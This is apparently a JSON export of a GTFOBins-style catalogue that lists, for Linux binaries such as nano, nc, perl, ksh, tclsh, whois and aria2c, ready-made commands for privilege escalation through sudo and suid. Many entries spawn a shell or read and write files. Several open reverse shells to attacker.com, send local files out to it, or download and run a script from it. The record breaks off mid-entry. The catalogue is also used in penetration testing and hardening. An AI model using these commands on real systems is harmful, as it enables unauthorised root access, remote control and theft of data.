{"_default": {"1": {"platform": "linux", "cmd": "nano", "function": "shell", "data": [{"code": "nano\n^R^X\nreset; sh 1>&0 2>&0\n"}, {"description": "The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.", "code": "nano -s /bin/sh\n/bin/sh\n^T\n"}]}, "2": {"platform": "linux", "cmd": "nano", "function": "file-write", "data": [{"code": "nano file_to_write\nDATA\n^O\n"}]}, "3": {"platform": "linux", "cmd": "nano", "function": "file-read", "data": [{"code": "nano file_to_read"}]}, "4": {"platform": "linux", "cmd": "nano", "function": "limited-suid", "data": [{"description": "The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.", "code": "./nano -s /bin/sh\n/bin/sh\n^T\n"}]}, "5": {"platform": "linux", "cmd": "nano", "function": "sudo", "data": [{"code": "sudo nano\n^R^X\nreset; sh 1>&0 2>&0\n"}]}, "6": {"platform": "linux", "cmd": "tclsh", "function": "shell", "data": [{"code": "tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"}]}, "7": {"platform": "linux", "cmd": "tclsh", "function": "non-interactive-reverse-shell", "data": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\necho 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh\n"}]}, "8": {"platform": "linux", "cmd": "tclsh", "function": "suid", "data": [{"code": "./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr\n"}]}, "9": {"platform": "linux", "cmd": "tclsh", "function": "sudo", "data": [{"code": "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"}]}, "10": {"platform": "linux", "cmd": "ss", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nss -a -F $LFILE\n"}]}, "11": {"platform": "linux", "cmd": "ss", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./ss -a -F $LFILE\n"}]}, "12": {"platform": "linux", "cmd": "ss", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo ss -a -F $LFILE\n"}]}, "13": {"platform": "linux", "cmd": "aria2c", "function": "command", "data": [{"code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\naria2c --on-download-error=$TF http://x\n"}, {"description": "The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.", "code": "aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa"}]}, "14": {"platform": "linux", "cmd": "aria2c", "function": "sudo", "data": [{"code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n"}]}, "15": {"platform": "linux", "cmd": "aria2c", "function": "limited-suid", "data": [{"code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x\n"}]}, "16": {"platform": "linux", "cmd": "make", "function": "shell", "data": [{"code": "COMMAND='/bin/sh'\nmake -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"}]}, "17": {"platform": "linux", "cmd": "make", "function": "file-write", "data": [{"description": "Requires a newer GNU `make` version.", "code": "LFILE=file_to_write\nmake -s --eval=\"\\$(file >$LFILE,DATA)\" .\n"}]}, "18": {"platform": "linux", "cmd": "make", "function": "suid", "data": [{"code": "COMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"}]}, "19": {"platform": "linux", "cmd": "make", "function": "sudo", "data": [{"code": "COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"}]}, "20": {"platform": "linux", "cmd": "nc", "function": "reverse-shell", "data": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.", "code": "RHOST=attacker.com\nRPORT=12345\nnc -e /bin/sh $RHOST $RPORT\n"}]}, "21": {"platform": "linux", "cmd": "nc", "function": "bind-shell", "data": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell. This only works with netcat traditional.", "code": "LPORT=12345\nnc -l -p $LPORT -e /bin/sh\n"}]}, "22": {"platform": "linux", "cmd": "nc", "function": "file-upload", "data": [{"description": "Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nnc $RHOST $RPORT < \"$LFILE\"\n"}]}, "23": {"platform": "linux", "cmd": "nc", "function": "file-download", "data": [{"description": "Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file.", "code": "LPORT=12345\nLFILE=file_to_save\nnc -l -p $LPORT > \"$LFILE\"\n"}]}, "24": {"platform": "linux", "cmd": "nc", "function": "sudo", "data": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.", "code": "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n"}]}, "25": {"platform": "linux", "cmd": "nc", "function": "limited-suid", "data": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.", "code": "RHOST=attacker.com\nRPORT=12345\n./nc -e /bin/sh $RHOST $RPORT\n"}]}, "26": {"platform": "linux", "cmd": "highlight", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nhighlight --no-doc --failsafe \"$LFILE\"\n"}]}, "27": {"platform": "linux", "cmd": "highlight", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\"\n"}]}, "28": {"platform": "linux", "cmd": "highlight", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\"\n"}]}, "29": {"platform": "linux", "cmd": "mawk", "function": "shell", "data": [{"code": "mawk 'BEGIN {system(\"/bin/sh\")}'"}]}, "30": {"platform": "linux", "cmd": "mawk", "function": "file-write", "data": [{"code": "LFILE=file_to_write\nmawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n"}]}, "31": {"platform": "linux", "cmd": "mawk", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nmawk '//' \"$LFILE\"\n"}]}, "32": {"platform": "linux", "cmd": "mawk", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./mawk '//' \"$LFILE\"\n"}]}, "33": {"platform": "linux", "cmd": "mawk", "function": "sudo", "data": [{"code": "sudo mawk 'BEGIN {system(\"/bin/sh\")}'"}]}, "34": {"platform": "linux", "cmd": "mawk", "function": "limited-suid", "data": [{"code": "./mawk 'BEGIN {system(\"/bin/sh\")}'"}]}, "35": {"platform": "linux", "cmd": "pr", "function": "file-read", "data": [{"code": "LFILE=file_to_read\npr -T $LFILE\n"}]}, "36": {"platform": "linux", "cmd": "pr", "function": "suid", "data": [{"code": "LFILE=file_to_read\npr -T $LFILE\n"}]}, "37": {"platform": "linux", "cmd": "pr", "function": "sudo", "data": [{"code": "LFILE=file_to_read\npr -T $LFILE\n"}]}, "38": {"platform": "linux", "cmd": "wish", "function": "shell", "data": [{"code": "wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"}]}, "39": {"platform": "linux", "cmd": "wish", "function": "non-interactive-reverse-shell", "data": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\necho 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish\n"}]}, "40": {"platform": "linux", "cmd": "wish", "function": "sudo", "data": [{"code": "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"}]}, "41": {"platform": "linux", "cmd": "sqlite3", "function": "shell", "data": [{"code": "sqlite3 /dev/null '.shell /bin/sh'"}]}, "42": {"platform": "linux", "cmd": "sqlite3", "function": "file-write", "data": [{"code": "LFILE=file_to_write\nsqlite3 /dev/null -cmd \".output $LFILE\" 'select \"DATA\";'\n"}]}, "43": {"platform": "linux", "cmd": "sqlite3", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n"}]}, "44": {"platform": "linux", "cmd": "sqlite3", "function": "suid", "data": [{"code": "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n"}]}, "45": {"platform": "linux", "cmd": "sqlite3", "function": "sudo", "data": [{"code": "sudo sqlite3 /dev/null '.shell /bin/sh'"}]}, "46": {"platform": "linux", "cmd": "sqlite3", "function": "limited-suid", "data": [{"code": "./sqlite3 /dev/null '.shell /bin/sh'"}]}, "47": {"platform": "linux", "cmd": "timeout", "function": "shell", "data": [{"code": "timeout 7d /bin/sh"}]}, "48": {"platform": "linux", "cmd": "timeout", "function": "suid", "data": [{"code": "./timeout 7d /bin/sh -p"}]}, "49": {"platform": "linux", "cmd": "timeout", "function": "sudo", "data": [{"code": "sudo timeout --foreground 7d /bin/sh"}]}, "50": {"platform": "linux", "cmd": "chroot", "function": "suid", "data": [{"code": "./chroot / /bin/sh -p\n"}]}, "51": {"platform": "linux", "cmd": "chroot", "function": "sudo", "data": [{"code": "sudo chroot /\n"}]}, "52": {"platform": "linux", "cmd": "base32", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode\n"}]}, "53": {"platform": "linux", "cmd": "base32", "function": "suid", "data": [{"code": "LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode\n"}]}, "54": {"platform": "linux", "cmd": "base32", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode\n"}]}, "55": {"platform": "linux", "cmd": "smbclient", "function": "shell", "data": [{"code": "smbclient '\\\\attacker\\share'\n!/bin/sh\n"}]}, "56": {"platform": "linux", "cmd": "smbclient", "function": "file-upload", "data": [{"description": "Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to collect the file.", "code": "smbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'\n"}]}, "57": {"platform": "linux", "cmd": "smbclient", "function": "file-download", "data": [{"description": "Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to send the file.", "code": "smbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'\n"}]}, "58": {"platform": "linux", "cmd": "smbclient", "function": "sudo", "data": [{"code": "sudo smbclient '\\\\attacker\\share'\n!/bin/sh\n"}]}, "59": {"platform": "linux", "cmd": "yelp", "function": "file-read", "data": [{"description": "This spawns a graphical window containing the file content somehow corrupted by word wrapping, it might not be suitable to read arbitrary files. The path must be absolute.", "code": "LFILE=file_to_read\nyelp \"man:$LFILE\"\n"}]}, "60": {"platform": "linux", "cmd": "csplit", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"}]}, "61": {"platform": "linux", "cmd": "csplit", "function": "suid", "data": [{"code": "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"}]}, "62": {"platform": "linux", "cmd": "csplit", "function": "sudo", "data": [{"code": "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"}]}, "63": {"platform": "linux", "cmd": "vigr", "function": "suid", "data": [{"code": "./vigr"}]}, "64": {"platform": "linux", "cmd": "vigr", "function": "sudo", "data": [{"code": "sudo vigr"}]}, "65": {"platform": "linux", "cmd": "red", "function": "file-write", "data": [{"code": "red file_to_write\na\nDATA\n.\nw\nq\n"}]}, "66": {"platform": "linux", "cmd": "red", "function": "file-read", "data": [{"code": "red file_to_read\n,p\nq\n"}]}, "67": {"platform": "linux", "cmd": "red", "function": "sudo", "data": [{"code": "sudo red file_to_write\na\nDATA\n.\nw\nq\n"}]}, "68": {"platform": "linux", "cmd": "perl", "function": "shell", "data": [{"code": "perl -e 'exec \"/bin/sh\";'"}]}, "69": {"platform": "linux", "cmd": "perl", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nperl -ne print $LFILE\n"}]}, "70": {"platform": "linux", "cmd": "perl", "function": "reverse-shell", "data": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nperl -e 'use Socket;$i=\"$ENV{RHOST}\";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n"}]}, "71": {"platform": "linux", "cmd": "perl", "function": "suid", "data": [{"code": "./perl -e 'exec \"/bin/sh\";'"}]}, "72": {"platform": "linux", "cmd": "perl", "function": "sudo", "data": [{"code": "sudo perl -e 'exec \"/bin/sh\";'"}]}, "73": {"platform": "linux", "cmd": "perl", "function": "capabilities", "data": [{"code": "./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"}]}, "74": {"platform": "linux", "cmd": "strings", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nstrings \"$LFILE\"\n"}]}, "75": {"platform": "linux", "cmd": "strings", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./strings \"$LFILE\"\n"}]}, "76": {"platform": "linux", "cmd": "strings", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo strings \"$LFILE\"\n"}]}, "77": {"platform": "linux", "cmd": "nroff", "function": "file-read", "data": [{"description": "The file is typeset and some warning messages may appear.", "code": "LFILE=file_to_read\nnroff $LFILE\n"}]}, "78": {"platform": "linux", "cmd": "nroff", "function": "shell", "data": [{"code": "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nGROFF_BIN_PATH=$TF nroff\n"}]}, "79": {"platform": "linux", "cmd": "nroff", "function": "sudo", "data": [{"code": "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff\n"}]}, "80": {"platform": "linux", "cmd": "ksh", "function": "shell", "data": [{"code": "ksh"}]}, "81": {"platform": "linux", "cmd": "ksh", "function": "reverse-shell", "data": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'\n"}]}, "82": {"platform": "linux", "cmd": "ksh", "function": "file-upload", "data": [{"description": "Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'echo -e \"POST / HTTP/0.9\\n\\n$(cat $LFILE)\" > /dev/tcp/$RHOST/$RPORT'\n"}, {"description": "Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'\n"}]}, "83": {"platform": "linux", "cmd": "ksh", "function": "file-download", "data": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nksh -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } > $LFILE'\n"}, {"description": "Fetch remote file using a TCP connection. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'\n"}]}, "84": {"platform": "linux", "cmd": "ksh", "function": "file-write", "data": [{"code": "export LFILE=file_to_write\nksh -c 'echo DATA > $LFILE'\n"}]}, "85": {"platform": "linux", "cmd": "ksh", "function": "file-read", "data": [{"description": "It trims trailing newlines.", "code": "export LFILE=file_to_read\nksh -c 'echo \"$(<$LFILE)\"'\n"}, {"description": "It trims trailing newlines.", "code": "export LFILE=file_to_read\nksh -c $'read -r -d \\x04 < \"$LFILE\"; echo \"$REPLY\"'\n"}]}, "86": {"platform": "linux", "cmd": "ksh", "function": "suid", "data": [{"code": "./ksh -p"}]}, "87": {"platform": "linux", "cmd": "ksh", "function": "sudo", "data": [{"code": "sudo ksh"}]}, "88": {"platform": "linux", "cmd": "top", "function": "shell", "data": [{"code": "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc\ntop\n# press return twice\nreset\n"}]}, "89": {"platform": "linux", "cmd": "top", "function": "sudo", "data": [{"description": "This requires that the root configuration file is writable and might be used to persist elevated privileges.", "code": "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset\n"}]}, "90": {"platform": "linux", "cmd": "crontab", "function": "command", "data": [{"description": "The commands are executed according to the crontab file edited via the `crontab` utility.", "code": "crontab -e"}]}, "91": {"platform": "linux", "cmd": "crontab", "function": "sudo", "data": [{"description": "The commands are executed according to the crontab file edited via the `crontab` utility.", "code": "sudo crontab -e"}]}, "92": {"platform": "linux", "cmd": "nohup", "function": "shell", "data": [{"code": "nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""}]}, "93": {"platform": "linux", "cmd": "nohup", "function": "command", "data": [{"code": "COMMAND='/usr/bin/id'\nnohup \"$COMMAND\"\ncat nohup.out\n"}]}, "94": {"platform": "linux", "cmd": "nohup", "function": "suid", "data": [{"code": "./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""}]}, "95": {"platform": "linux", "cmd": "nohup", "function": "sudo", "data": [{"code": "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""}]}, "96": {"platform": "linux", "cmd": "head", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nhead -c1G \"$LFILE\"\n"}]}, "97": {"platform": "linux", "cmd": "head", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./head -c1G \"$LFILE\"\n"}]}, "98": {"platform": "linux", "cmd": "head", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo head -c1G \"$LFILE\"\n"}]}, "99": {"platform": "linux", "cmd": "crash", "function": "shell", "data": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "crash -h\n!sh\n"}]}, "100": {"platform": "linux", "cmd": "crash", "function": "command", "data": [{"code": "COMMAND='/usr/bin/id'\nCRASHPAGER=\"$COMMAND\" crash -h\n"}]}, "101": {"platform": "linux", "cmd": "crash", "function": "sudo", "data": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "sudo crash -h\n!sh\n"}]}, "102": {"platform": "linux", "cmd": "sysctl", "function": "file-read", "data": [{"code": "LFILE=file_to_read\n/usr/sbin/sysctl -n \"/../../$LFILE\"\n"}]}, "103": {"platform": "linux", "cmd": "sysctl", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./sysctl -n \"/../../$LFILE\"\n"}]}, "104": {"platform": "linux", "cmd": "sysctl", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo sysctl -n \"/../../$LFILE\"\n"}]}, "105": {"platform": "linux", "cmd": "zsoelim", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nzsoelim \"$LFILE\"\n"}]}, "106": {"platform": "linux", "cmd": "zsoelim", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./zsoelim \"$LFILE\"\n"}]}, "107": {"platform": "linux", "cmd": "zsoelim", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo zsoelim \"$LFILE\"\n"}]}, "108": {"platform": "linux", "cmd": "hexdump", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nhexdump -C \"$LFILE\"\n"}]}, "109": {"platform": "linux", "cmd": "hexdump", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./hexdump -C \"$LFILE\"\n"}]}, "110": {"platform": "linux", "cmd": "hexdump", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo hexdump -C \"$LFILE\"\n"}]}, "111": {"platform": "linux", "cmd": "cowthink", "function": "shell", "data": [{"code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\ncowthink -f $TF x\n"}]}, "112": {"platform": "linux", "cmd": "cowthink", "function": "sudo", "data": [{"code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x\n"}]}, "113": {"platform": "linux", "cmd": "readelf", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nreadelf -a @$LFILE\n"}]}, "114": {"platform": "linux", "cmd": "readelf", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./readelf -a @$LFILE\n"}]}, "115": {"platform": "linux", "cmd": "readelf", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo readelf -a @$LFILE\n"}]}, "116": {"platform": "linux", "cmd": "ltrace", "function": "file-read", "data": [{"description": "The file is parsed as a configuration file and its content is shown as error messages, thus this is not suitable to exfiltrate binary files.", "code": "LFILE=file_to_read\nltrace -F $LFILE /dev/null\n"}]}, "117": {"platform": "linux", "cmd": "ltrace", "function": "file-write", "data": [{"description": "The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`.", "code": "LFILE=file_to_write\nltrace -s 999 -o $LFILE ltrace -F DATA\n"}]}, "118": {"platform": "linux", "cmd": "ltrace", "function": "shell", "data": [{"code": "ltrace -b -L /bin/sh"}]}, "119": {"platform": "linux", "cmd": "ltrace", "function": "sudo", "data": [{"code": "sudo ltrace -b -L /bin/sh"}]}, "120": {"platform": "linux", "cmd": "whois", "function": "file-upload", "data": [{"description": "Send a text file to a TCP port. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. The file has a trailing `$'\\x0d\\x0a'` and its length is limited by the maximum size of arguments.", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nwhois -h $RHOST -p $RPORT \"`cat $LFILE`\"\n"}, {"description": "Send a binary file to a TCP port. Run `nc -l -p 12345 | tr -d $'\\x0d' | base64 -d > \"file_to_save\"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nwhois -h $RHOST -p $RPORT \"`base64 $LFILE`\"\n"}]}, "121": {"platform": "linux", "cmd": "whois", "function": "file-download", "data": [{"description": "Fetch remote text file from a remote TCP port. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file. The file has instances of `$'\\x0d'` stripped.", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT > \"$LFILE\"\n"}, {"description": "Fetch remote binary file from a remote TCP port. Run `base64 \"file_to_send\" | nc -l -p 12345` on the attacker box to send the file.", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT | base64 -d > \"$LFILE\"\n"}]}, "122": {"platform": "linux", "cmd": "ftp", "function": "shell", "data": [{"code": "ftp\n!/bin/sh\n"}]}, "123": {"platform": "linux", "cmd": "ftp", "function": "file-upload", "data": [{"description": "Send local file to a FTP server.", "code": "RHOST=attacker.com\nftp $RHOST\nput file_to_send\n"}]}, "124": {"platform": "linux", "cmd": "ftp", "function": "file-download", "data": [{"description": "Fetch a remote file from a FTP server.", "code": "RHOST=attacker.com\nftp $RHOST\nget file_to_get\n"}]}, "125": {"platform": "linux", "cmd": "ftp", "function": "sudo", "data": [{"code": "sudo ftp\n!/bin/sh\n"}]}, "126": {"platform": "linux", "cmd": "vipw", "function": "suid", "data": [{"code": "./vipw"}]}, "127": {"platform": "linux", "cmd": "vipw", "function": "sudo", "data": [{"code": "sudo vipw"}]}, "128": {"platform": "linux", "cmd": "od", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nod -An -c -w9999 \"$LFILE\"\n"}]}, "129": {"platform": "linux", "cmd": "od", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\"\n"}]}, "130": {"platform": "linux", "cmd": "od", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\"\n"}]}, "131": {"platform": "linux", "cmd": "xxd", "function": "file-write", "data": [{"code": "LFILE=file_to_write\necho DATA | xxd | xxd -r - \"$LFILE\"\n"}]}, "132": {"platform": "linux", "cmd": "xxd", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nxxd \"$LFILE\" | xxd -r\n"}]}, "133": {"platform": "linux", "cmd": "xxd", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r\n"}]}, "134": {"platform": "linux", "cmd": "xxd", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r\n"}]}, "135": {"platform": "linux", "cmd": "check_by_ssh", "function": "shell", "data": [{"description": "The shell will only last 10 seconds.", "code": "check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"}]}, "136": {"platform": "linux", "cmd": "check_by_ssh", "function": "sudo", "data": [{"description": "The shell will only last 10 seconds.", "code": "sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"}]}, "137": {"platform": "linux", "cmd": "troff", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ntroff $LFILE\n"}]}, "138": {"platform": "linux", "cmd": "troff", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./troff $LFILE\n"}]}, "139": {"platform": "linux", "cmd": "troff", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo troff $LFILE\n"}]}, "140": {"platform": "linux", "cmd": "expect", "function": "shell", "data": [{"code": "expect -c 'spawn /bin/sh;interact'"}]}, "141": {"platform": "linux", "cmd": "expect", "function": "suid", "data": [{"code": "./expect -c 'spawn /bin/sh -p;interact'"}]}, "142": {"platform": "linux", "cmd": "expect", "function": "sudo", "data": [{"code": "sudo expect -c 'spawn /bin/sh;interact'"}]}, "143": {"platform": "linux", "cmd": "composer", "function": "shell", "data": [{"code": "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\ncomposer --working-dir=$TF run-script x\n"}]}, "144": {"platform": "linux", "cmd": "composer", "function": "limited-suid", "data": [{"code": "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\n./composer --working-dir=$TF run-script x\n"}]}, "145": {"platform": "linux", "cmd": "composer", "function": "sudo", "data": [{"code": "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x\n"}]}, "146": {"platform": "linux", "cmd": "column", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ncolumn $LFILE\n"}]}, "147": {"platform": "linux", "cmd": "column", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./column $LFILE\n"}]}, "148": {"platform": "linux", "cmd": "column", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo column $LFILE\n"}]}, "149": {"platform": "linux", "cmd": "ex", "function": "shell", "data": [{"code": "ex\n!/bin/sh\n"}]}, "150": {"platform": "linux", "cmd": "ex", "function": "file-write", "data": [{"code": "ex file_to_write\na\nDATA\n.\nw\nq\n"}]}, "151": {"platform": "linux", "cmd": "ex", "function": "file-read", "data": [{"code": "ex file_to_read\n,p\nq\n"}]}, "152": {"platform": "linux", "cmd": "ex", "function": "sudo", "data": [{"code": "sudo ex\n!/bin/sh\n"}]}, "153": {"platform": "linux", "cmd": "eqn", "function": "file-read", "data": [{"code": "LFILE=file_to_read\neqn \"$LFILE\"\n"}]}, "154": {"platform": "linux", "cmd": "eqn", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./eqn \"$LFILE\"\n"}]}, "155": {"platform": "linux", "cmd": "eqn", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo eqn \"$LFILE\"\n"}]}, "156": {"platform": "linux", "cmd": "exiftool", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nOUTPUT=output_file\nexiftool -filename=$OUTPUT $LFILE\ncat $OUTPUT\n"}]}, "157": {"platform": "linux", "cmd": "exiftool", "function": "file-write", "data": [{"code": "LFILE=file_to_write\nINPUT=input_file\nexiftool -filename=$LFILE $INPUT\n"}]}, "158": {"platform": "linux", "cmd": "exiftool", "function": "sudo", "data": [{"code": "LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT\n"}]}, "159": {"platform": "linux", "cmd": "unshare", "function": "shell", "data": [{"code": "unshare /bin/sh"}]}, "160": {"platform": "linux", "cmd": "unshare", "function": "suid", 